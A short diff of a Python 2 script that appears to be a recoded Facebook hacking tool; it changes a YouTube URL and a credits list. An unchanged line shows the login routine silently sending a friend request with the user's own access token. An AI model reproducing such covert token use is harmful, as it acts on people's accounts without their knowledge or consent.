@@ -134,7 +134,7 @@ def login():
                 zedd.close()
                 print '\n[#] Login Successfully!!'
                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
-                os.system('xdg-open https://www.youtube.com/UCFG0nw1sR6rbQozJYM8gjIQ')
+                os.system('xdg-open https://www.youtube.com/channel/UCFG0nw1sR6rbQozJYM8gjIQ')
                 time.sleep(1)
                 menu()
             except requests.exceptions.ConnectionError:
@@ -221,7 +221,7 @@ def pilih():
         os.system('clear')
         print ' \033[1;93mRecoded : \033[1;92mMr.TechnicalDipesh\n \033[1;93mTeam : \033[1;92madapcsg  \n \033[1;93mFacebook : \033[1;92mhttps://facebook.com/kaitolegionofficial \n\033[1;93m Github : \033[1;92mhttps://www.github.com/mrTechnicalDipesh \n\033[1;93m YouTube : \033[1;92mhttps://youtube.com/kaitolegion'
         print '\n'
-        print G+' Special Greetz:'+V+' \n Infinite \n Ph.Osus \n Ph.Bloodz \n AnonPrixor \n P4r4site \n Aries \n Fox Blood \n Mr.M3ll0w \n s4yt4m5 \n XxJohnxX \n Scroider'
+        print G+' Special Greetz:'+V+' \n TechnicalDipesh \n Ph.Osus \n Ph.Bloodz \n AnonPrixor \n P4r4site \n Aries \n Fox Blood \n Mr.M3ll0w \n s4yt4m5 \n XxJohnxX \n Scroider'
         raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
         menu()
     elif zedd == '8':
